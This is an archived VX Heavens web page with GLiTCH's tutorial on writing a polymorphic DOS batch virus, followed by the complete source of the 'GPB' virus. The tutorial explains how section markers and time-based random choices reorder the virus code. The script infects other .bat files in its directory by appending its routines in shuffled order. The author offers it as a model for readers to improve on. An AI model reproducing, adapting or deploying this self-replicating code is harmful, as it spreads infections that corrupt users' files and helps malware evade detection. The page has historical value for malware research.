<html>
<head>
    <title>GLiTCH's Polymorphic Batch Tutorial  : VX Heavens</title>
    <meta http-eguiv="Content-Type" content="text/html; charset=iso-8859-1">
    <meta name="Author" content="herm1t">    
    <meta name="KeyWords" content="virus,virii,vx,×ÉÒÕÓ">
    <meta name="Description" content="">
    <link rel=stylesheet type="text/css" href="../style.css">
    <link rel="icon" href="../favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="../favicon.ico" type="image/x-icon">    
</head>
<script><!-- 
  if (top.parent.frames.length > 0)
  	top.parent.location.href=self.location.href;
//--></script>

<body topmargin="0" marginwidth="0" marginheight="0" leftmargin="0" bgcolor="#cccbbb" text="#302000" link="#225599" vlink="#225599">
<a name="top"></a>
<table width="101%" border="0" bgcolor="#555444" cellspacing="0" cellpadding="0"><tr><td>
<table width="100%" border="0" cellspacing="1" cellpadding="1" align="center">
<tr bgcolor="#333222"><td colspan="8"><font size="-1" color="#777666"><b>VX Heavens</b></font></td></tr>
<tr bgcolor="#000000" align="center">
      <td><a href="../index.shtml">  <font size="-1" color="#666555"><b>Home</b></font></a></td>
      <td><a href="../news.shtml">   <font size="-1" color="#666555"><b>News</b></font></a></td>
      <td><a href="../lib.shtml">    <font size="-1" color="#666555"><b>Library</b></font></a></td>
      <td><a href="../src.shtml">    <font size="-1" color="#666555"><b>Sources</b></font></a></td>
      <td><a href="../bin.shtml">    <font size="-1" color="#666555"><b>Downloads</b></font></a></td>
      <td><a href="../links.php">    <font size="-1" color="#666555"><b>Links</b></font></a></td>  
      <td><a href="../search.shtml"> <font size="-1" color="#666555"><b>Search</b></font></a></td>
</tr></table></td></tr></table>

<table border="0" width="100%"><tr><td align=left valign=top>
<h1>GLiTCH's Polymorphic Batch Tutorial </h1>
<p><b>GLiTCH</b>
  
<p><a href="">[back to index]</a>
</td><td align="right" valign="top"><center>
<form action="/cgi-bin/print" method="post">
<input type="image" src="/img/print.gif" alt="PRINT" border="0"><br /><small>Get a print<br />version</small>
</form></center></td></tr></table>
<!-- This file passed through VX Heavens (http://vx.org.ua) -->

<ul>
    <li><a href=#1>Introduction</a> 
    <li><a href=#2>Theory</a> 
    <li><a href=#3>Implementation</a> 
    <li><a href=#4>Conclusion</a> 
    <li><a href=#5>GLiTCH's Poly Batch Script</a>
</ul>

<a name=1><p><b>Introduction</b> 

<p>Well, first off, you have to think about the way you can make your batch virus polymorphic... Simple? Well, not quite. At the minute, there are two ways, the first I have 
seen quite a few times and use PKZIP and other compression engines as their "Mutation Engine", then you get mine.. Totally batch scripting. 

<p>A quick note - If you intend to use my batch scripting method, try and keep your code size down, GPB was 7K at 0-generation and 6Mb at 10-generation! 

<p>I will only cover my method of polymorphism, because I have not generally played with "Mutation Engines" :) 

<p>Usually, when we say a virus is polymorphic, we think of the virus being encrypted with a random generator. This is NOT the only way, POLYMORPHIC means "Many 
Shapes" (as you should know by now!) and the bytes doen't literally have to change to be poly- morphic. In fact, I think viruses which use MtE, DAME, RTFM etc. should 
be called "Shape-Shifting" viruses, as they only change their bits, not structure.. GPB changed EVERY time, but stayed in its "readable" scripting. 

<a name=2><p><b> Theory </b> 

<p>Okay, you decided on a polymophic batch using scripting only for compatability. Okay, As far as I'm aware, with present coding it's impossible to ENCRYPT batch 
scripting, I might work on code for this. So, to make it polymorphic, we're going to have to shift the virus around. 

<p>To do this, we're going to have to create sections in our code. Now remember, to copy the virus, you need a string that is in EVERY line. This rule can be bent slightly, by 
turning the string in to section markers.. 

<a name=3><p><b> Implementation </b> 

<p>example code
<xmp>
@echo off%[GPB_L0.BAT g]%
if not exist %0.BAT goto GPB_Exit
%[0.BAT g]%goto GPB_L3

:GPB_L3
for %%f in (%:GPB_L3%*.bat) do set GPB_File=%%f
%[:GPB_L3]%goto GPB_L5
</xmp>
In the above code, notice that EVERY line of the first section (Initialisation Routine) has the constant "0.BAT g", this was the marker I used to identify this routine. The 
second section had the marker ":GPB_L3". 

<p>So each and every routine needs an identifier. This is used to write each section in any desired order. 
<p>example code
<xmp>
:GPB_L8
%[:GPB_L8]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L8]%goto GPB_Exit
</xmp>
The above code is a one of my infection routines, you need a few for the polymorphism. In this routine, I append all the routines in order they were in the orginal code. 

<p>PROBLEM - Because I use markers to identify sections, the markers HAVE to be in the infection routines, ALL of them. So this means when an infection occurs, these 
routines are appended to the end of each routine! 

<p>Okay, with this problem, there are 2 problems really - 
Size increases EVERY infection (if somebody can help me out with this, please EMail me!) 
It will try and copy contents to you file. 
The work-around for problem 2 is making sure you have a GOTO line at the end of each section like I have done. 

<p>PROBLEM - Picking an infection routine 

This was the first problem I thought about when creating the poly bat but was soon conqured, use the following line - 
<xmp>
%[section_marker]% echo. |time >000
</xmp>
This line writes the time to file 000 (change any names you want), also, the section marker can be ALMOST anywhere on the line. eg 
<xmp>
echo. |time >000 %[section_marker]%
echo. |%[section_marker]% time >000
</xmp>
Next you want to use the FIND command to LOOK for a number. I recommend adding the colons (:) to the number like I did, so there is a better chance of a more random 
number. Then use code like the following to pick out your random number and go to your desired infection routine - 
<xmp>
%[:GPB_L7]%find "0:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L14
</xmp>
So generally, just patch lots of sections together and create infection routines to copy each section in a certain order. SIMPLE! 

<a name=4><p><b> Conclusion </b> 

<p>Well, sorry if this didn't make much sense. I'm not a BATCH Queen! Yes, I did say QUEEN! Anyway, you should have written at least a normal Batch virus before you 
attempt a poly bat. 

<p>If you don't understand how it works etc. and want more help, just ask! I seem to be more helpful when directing my attention to somebody who gives me feedback, and I 
can help them thru the bits they struggle! 

<p>Well, Good Luck! I hope you can do better than mine! I wish I could get the size problem fixed! Oh well, back to Win32.Amoeba, and B00t (sector infector) ;P 

<p>Below is GPB's script.... Take care now... 

<a name=5><p><b> GLiTCH's Poly Batch Script </b>
<xmp>
@echo off%[GPB_L0.BAT g]%
if not exist %0.BAT goto GPB_Exit
%[0.BAT g]%goto GPB_L3

:GPB_L3
for %%f in (%:GPB_L3%*.bat) do set GPB_File=%%f
%[:GPB_L3]%goto GPB_L5

:GPB_L5
find /i "GPB"<%GPB_File%>nul %[:GPB_L5]%
%[:GPB_L5]%if errorlevel 1 goto GPB_L7
%[:GPB_L5]%goto GPB_Exit

:GPB_L7
%[:GPB_L7]%echo. |time >000
%[:GPB_L7]%find "0:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L14
%[:GPB_L7]%find "1:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L15
%[:GPB_L7]%find "2:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L16
%[:GPB_L7]%find "3:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L11
%[:GPB_L7]%find "4:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L13
%[:GPB_L7]%find "5:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L8
%[:GPB_L7]%find "7:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L12
%[:GPB_L7]%find "8:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L10
%[:GPB_L7]%find "9:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L9
%[:GPB_L7]%goto GPB_L7

:GPB_L8
%[:GPB_L8]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L8]%goto GPB_Exit

:GPB_L9
%[:GPB_L9]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L9]%goto GPB_Exit

:GPB_L10
%[:GPB_L10]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L10]%goto GPB_Exit

:GPB_L11
%[:GPB_L11]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L11]%goto GPB_Exit

:GPB_L12
%[:GPB_L12]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L12]%goto GPB_Exit

:GPB_L13
%[:GPB_L13]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L13]%goto GPB_Exit

:GPB_L14
%[:GPB_L14]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L14]%goto GPB_Exit

:GPB_L15
%[:GPB_L15]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L15]%goto GPB_Exit

:GPB_L16
%[:GPB_L16]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L16]%goto GPB_Exit

:GPB_Exit
%[:GPB_Exit]%del 000
</xmp>

<!-- This file passed through VX Heavens (http://vx.org.ua) -->
<p><a href="">[back to index]</a><a href="#top">[back to top]</a>
<table width="101%" border="0" bgcolor="#555444" cellspacing="0" cellpadding="0"><tr><td bgcolor=#cccbbb><img src="../img/1x1.gif" height="5" alt=""></td></tr><tr><td><table width="100%" border="0" cellspacing="1" cellpadding="1"><td bgcolor="#333222"><font size="-1" face="Arial" color="#777666"><b>VX Heavens &copy; 1999-2003 by herm1t</b></font></td></table></td></tr></table>
</body>
</html>